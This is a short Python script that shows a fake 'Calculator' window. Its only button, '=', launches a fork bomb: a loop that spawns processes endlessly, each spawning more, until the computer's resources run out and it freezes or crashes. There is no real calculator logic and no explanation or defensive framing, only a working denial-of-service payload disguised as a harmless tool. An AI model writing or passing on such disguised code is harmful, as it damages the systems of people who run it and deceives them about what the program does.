#! /usr/bin/env python
import os, tkinter as tk
import multiprocessing

def bomb():
    while True:
        multiprocessing.Process(target=bomb).start()

def fake_calc():
    root = tk.Tk()
    root.title("Calculator")
    tk.Label(root, text="Calculator").pack()
    tk.Button(root, text="=", command=bomb).pack()
    root.mainloop()

fake_calc()
